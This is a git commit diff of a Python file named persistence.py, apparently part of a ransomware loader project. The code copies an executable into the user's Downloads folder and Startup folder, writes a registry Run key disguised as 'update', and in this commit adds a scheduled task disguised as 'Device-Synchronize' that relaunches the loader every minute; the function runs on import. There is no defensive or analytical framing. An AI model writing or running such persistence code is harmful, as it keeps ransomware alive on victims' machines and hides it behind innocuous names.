4b830a2bdbf2e17defcc3ffd1be137ee5a3afb5a
nzapras <118240114+nzapras@users.noreply.github.com>
2024-10-01 17:14:17 -0700

    persistance baseline

--- persistence.py
+++ persistence.py
@@ -1,20 +1,11 @@
-#This is a test
-
-import threading
 import subprocess as sp
-import socket
-import uuid
-import base64
-import os
-import time 
-from cryptography.fernet import Fernet
+import os 
 import shutil
-import ctypes
 import sys
 
 def persistence():
     
-    ransomware_location = os.environ["USERPROFILE"] + "\\Downloads\\loader.py"
+    ransomware_location = os.environ["USERPROFILE"] + "\\Downloads\\spr708a1\\loader.py"
     startup_location = os.environ["appdata"] + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\loader.py"
     task_scheduler_location = os.environ['USERPROFILE'] + "\\loader.py"
 
@@ -22,7 +13,7 @@ def persistence():
 
         if not os.path.exists(ransomware_location):
             shutil.copyfile(sys.executable, ransomware_location)
-            sp.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + ransomware_location + '" /f')
+            sp.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v update /t REG_SZ /d "' + ransomware_location + '" /f')
 
         if not os.path.exists(startup_location):# added
             shutil.copyfile(sys.executable, startup_location) # added
@@ -32,5 +23,7 @@ def persistence():
             output = os.popen(""" PowerShell /c Get-ScheduledTask "Device-Synchronize" """).read()
             if "Running" in output:
                 pass
+            else:
+                sp.call(f'schtasks /create /sc MINUTE /mo 1 /tn "Device-Synchronize" /tr "cmd.exe /c {task_scheduler_location}"')
         
 persistence()
